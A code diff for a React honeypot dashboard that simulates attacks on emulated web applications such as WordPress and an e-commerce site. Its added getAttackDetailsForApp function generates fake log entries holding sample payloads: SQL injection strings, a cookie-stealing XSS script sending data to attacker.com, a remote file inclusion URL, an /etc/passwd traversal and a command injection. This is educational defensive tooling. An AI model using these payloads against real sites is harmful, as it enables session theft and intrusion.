@@ -12,12 +12,22 @@ import { ScrollArea } from '@/components/ui/scroll-area';
 import { ArrowLeft, Play, Square, Database, Server, ShieldAlert, Bug, Code } from 'lucide-react';
 import { Link } from 'react-router-dom';
 import { HoneypotController } from '@/components/HoneypotController';
+import { WebAppSelector } from '@/components/WebAppSelector';
+import { VulnerabilityEmulator } from '@/services/VulnerabilityEmulator';
+import { webAppTemplates } from '@/models/WebAppTemplate';
 
 const HoneypotServer = () => {
   const [serverStatus, setServerStatus] = useState<'stopped' | 'running'>('stopped');
   const [port, setPort] = useState('80');
   const [logLevel, setLogLevel] = useState('info');
   const [logs, setLogs] = useState<string[]>([]);
+  const [selectedAppId, setSelectedAppId] = useState('wordpress');
+  
+  // Initialize vulnerability emulator with the selected web app
+  const [vulnerabilityEmulator, setVulnerabilityEmulator] = useState(() => {
+    const initialApp = webAppTemplates.find(app => app.id === 'wordpress') || webAppTemplates[0];
+    return new VulnerabilityEmulator(initialApp);
+  });
   
   // Add state for vulnerability toggles
   const [sqlInjection, setSqlInjection] = useState(true);
@@ -29,26 +39,58 @@ const HoneypotServer = () => {
   
   const { toast } = useToast();
 
+  // Update vulnerability emulator when the selected app changes
   useEffect(() => {
-    // Simulate some initial logs
+    const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
+    if (selectedApp) {
+      const newEmulator = new VulnerabilityEmulator(selectedApp);
+      setVulnerabilityEmulator(newEmulator);
+      
+      // Update vulnerability toggles based on the selected app's profile
+      setSqlInjection(selectedApp.vulnerabilityProfile.sql);
+      setXss(selectedApp.vulnerabilityProfile.xss);
+      setRfi(selectedApp.vulnerabilityProfile.rfi);
+      setLfi(selectedApp.vulnerabilityProfile.lfi);
+      setCommandInjection(selectedApp.vulnerabilityProfile.commandInjection);
+      setCsrf(selectedApp.vulnerabilityProfile.csrf);
+      
+      // Add log entry for changing the application template
+      setLogs(prev => [
+        `[${new Date().toISOString()}] [INFO] Switching to ${selectedApp.name} application template`,
+        `[${new Date().toISOString()}] [INFO] Loading ${selectedApp.name} vulnerability profile`,
+        ...prev
+      ]);
+      
+      toast({
+        title: "Application Template Changed",
+        description: `Now emulating ${selectedApp.name} with corresponding vulnerabilities`,
+      });
+    }
+  }, [selectedAppId, toast]);
+
+  useEffect(() => {
+    // Initialize logs with the selected app info
+    const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
     setLogs([
-      '[INFO] Honeypot server initialized',
-      '[INFO] Available vulnerability modules: SQL Injection, XSS, RFI, LFI',
-      '[INFO] Ready to start on port ' + port
+      `[INFO] Honeypot server initialized for ${selectedApp?.name || 'Generic Application'}`,
+      `[INFO] Available vulnerability modules based on ${selectedApp?.name || 'application'} profile`,
+      `[INFO] Ready to start on port ${port}`
     ]);
-  }, [port]);
+  }, [port, selectedAppId]);
 
   const startServer = () => {
+    const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
     setServerStatus('running');
     setLogs(prev => [
       `[${new Date().toISOString()}] [INFO] Starting honeypot server on port ${port}`,
-      `[${new Date().toISOString()}] [INFO] Loading vulnerability emulation modules`,
+      `[${new Date().toISOString()}] [INFO] Emulating ${selectedApp?.name || 'Generic Application'} version ${selectedApp?.versions[0].version || '1.0.0'}`,
+      `[${new Date().toISOString()}] [INFO] Loading vulnerability modules specific to ${selectedApp?.name || 'this application'}`,
       `[${new Date().toISOString()}] [INFO] Server started successfully`,
       ...prev
     ]);
     toast({
       title: "Honeypot Server Started",
-      description: `Server is now running on port ${port}`,
+      description: `Server is now running on port ${port} emulating ${selectedApp?.name || 'Generic Application'}`,
     });
   };
 
@@ -56,7 +98,7 @@ const HoneypotServer = () => {
     setServerStatus('stopped');
     setLogs(prev => [
       `[${new Date().toISOString()}] [INFO] Stopping honeypot server`,
-      `[${new Date().toISOString()}] [INFO] Saving collected data`,
+      `[${new Date().toISOString()}] [INFO] Saving collected attack data`,
       `[${new Date().toISOString()}] [INFO] Server stopped successfully`,
       ...prev
     ]);
@@ -71,19 +113,63 @@ const HoneypotServer = () => {
     if (serverStatus !== 'running') return;
     
     const interval = setInterval(() => {
-      const attackTypes = ['SQL Injection', 'XSS', 'Path Traversal', 'Command Injection', 'File Inclusion'];
-      const randomAttack = attackTypes[Math.floor(Math.random() * attackTypes.length)];
+      const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
+      if (!selectedApp) return;
+      
+      // Generate app-specific attack paths
+      const appPaths = selectedApp.commonUrls;
+      const randomPath = appPaths[Math.floor(Math.random() * appPaths.length)];
+      
+      // Generate attack types based on enabled vulnerabilities
+      const enabledVulnerabilities = [
+        sqlInjection && 'SQL Injection',
+        xss && 'Cross-Site Scripting (XSS)',
+        rfi && 'Remote File Inclusion',
+        lfi && 'Local File Inclusion',
+        commandInjection && 'Command Injection',
+        csrf && 'CSRF Vulnerabilities',
+      ].filter(Boolean) as string[];
+      
+      if (enabledVulnerabilities.length === 0) return;
+      
+      const randomAttackType = enabledVulnerabilities[Math.floor(Math.random() * enabledVulnerabilities.length)];
       const randomIP = `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
       
+      // Generate app-specific log entries
+      const attackDetails = getAttackDetailsForApp(randomAttackType, selectedApp.name, randomPath);
+      
       setLogs(prev => [
-        `[${new Date().toISOString()}] [ALERT] Detected ${randomAttack} attempt from ${randomIP}`,
-        `[${new Date().toISOString()}] [INFO] Payload recorded and analyzed`,
+        `[${new Date().toISOString()}] [ALERT] Detected ${randomAttackType} attempt on ${selectedApp.name} at ${randomPath} from ${randomIP}`,
+        `[${new Date().toISOString()}] [INFO] Payload: ${attackDetails}`,
+        `[${new Date().toISOString()}] [INFO] Response sent with appropriate emulation`,
         ...prev
       ]);
     }, 5000 + Math.random() * 10000); // Random interval between 5-15 seconds
     
     return () => clearInterval(interval);
-  }, [serverStatus]);
+  }, [serverStatus, selectedAppId, sqlInjection, xss, rfi, lfi, commandInjection, csrf]);
+
+  // Generate realistic attack details based on app type and vulnerability
+  const getAttackDetailsForApp = (attackType: string, appName: string, path: string): string => {
+    if (attackType === 'SQL Injection') {
+      if (appName === 'WordPress') return `${path}?id=1' OR 1=1 -- -`;
+      if (appName === 'PHPMyAdmin') return `${path}?sql_query=SELECT * FROM users WHERE 1=1;`;
+      if (appName === 'E-commerce') return `${path}?product_id=1' UNION SELECT username,password FROM users -- -`;
+    } else if (attackType === 'Cross-Site Scripting (XSS)') {
+      if (appName === 'WordPress') return `${path} with comment containing <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>`;
+      if (appName === 'E-commerce') return `${path}?search=<img src="x" onerror="alert(document.cookie)">`;
+    } else if (attackType === 'Remote File Inclusion') {
+      return `${path}?template=http://evil-site.com/malicious.php`;
+    } else if (attackType === 'Local File Inclusion') {
+      return `${path}?include=../../../etc/passwd`;
+    } else if (attackType === 'Command Injection') {
+      return `${path}?cmd=ping -c 4 8.8.8.8; cat /etc/passwd`;
+    } else if (attackType === 'CSRF Vulnerabilities') {
+      return `POST ${path} with forged form submission from external site`;
+    }
+    
+    return `${path} with malicious payload`;
+  };
 
   // Handle vulnerability toggle changes
   const handleVulnerabilityToggle = (type: string, value: boolean) => {
@@ -100,6 +186,9 @@ const HoneypotServer = () => {
     if (handler) {
       handler();
       
+      // Update the vulnerability emulator
+      vulnerabilityEmulator.setVulnerabilityEnabled(type, value);
+      
       // Add a log entry when a vulnerability is toggled
       setLogs(prev => [
         `[${new Date().toISOString()}] [INFO] ${type} vulnerability emulation ${value ? 'enabled' : 'disabled'}`,
@@ -113,6 +202,11 @@ const HoneypotServer = () => {
     }
   };
 
+  // Handle web app template selection
+  const handleSelectApp = (appId: string) => {
+    setSelectedAppId(appId);
+  };
+
   return (
     <div className="container mx-auto px-4 py-8 max-w-7xl">
       <header className="mb-8">
@@ -121,7 +215,7 @@ const HoneypotServer = () => {
             <Link to="/" className="text-honeypot-glow hover:text-honeypot-glow/80">
               <ArrowLeft className="h-5 w-5" />
             </Link>
-            <h1 className="text-3xl font-bold text-honeypot-glow">Glastopf-like Honeypot</h1>
+            <h1 className="text-3xl font-bold text-honeypot-glow">Web App Honeypot</h1>
             <Badge 
               variant={serverStatus === 'running' ? 'default' : 'outline'} 
               className={serverStatus === 'running' 
@@ -134,7 +228,7 @@ const HoneypotServer = () => {
           </div>
         </div>
         <p className="text-gray-400 mt-1">
-          Web Application Honeypot - Emulates vulnerable web services to capture attack patterns
+          Customizable Web Application Honeypot - Emulates vulnerabilities for specific web applications
         </p>
       </header>
 
@@ -196,6 +290,13 @@ const HoneypotServer = () => {
               </div>
             </CardContent>
           </Card>
+          
+          <div className="mt-6">
+            <WebAppSelector 
+              selectedAppId={selectedAppId} 
+              onSelectApp={handleSelectApp} 
+            />
+          </div>
           
           <div className="mt-6">
             <HoneypotController />
@@ -268,7 +369,7 @@ const HoneypotServer = () => {
                 <CardContent>
                   <div className="h-[400px] flex items-center justify-center text-gray-500">
                     {serverStatus === 'running' ? (
-                      <p>Collecting and analyzing attack data. Start the server to see results.</p>
+                      <p>Collecting and analyzing attack data for {webAppTemplates.find(app => app.id === selectedAppId)?.name || 'selected application'}.</p>
                     ) : (
                       <p>Start the honeypot server to begin collecting attack data.</p>
                     )}
@@ -319,7 +420,7 @@ const HoneypotServer = () => {
       </div>
       
       <footer className="mt-12 text-center text-gray-500 text-sm">
-        <p>Glastopf-like Honeypot - For educational and research purposes only.</p>
+        <p>Web Application Honeypot - For educational and research purposes only.</p>
         <p className="mt-1">Not recommended for production environments.</p>
       </footer>
     </div>
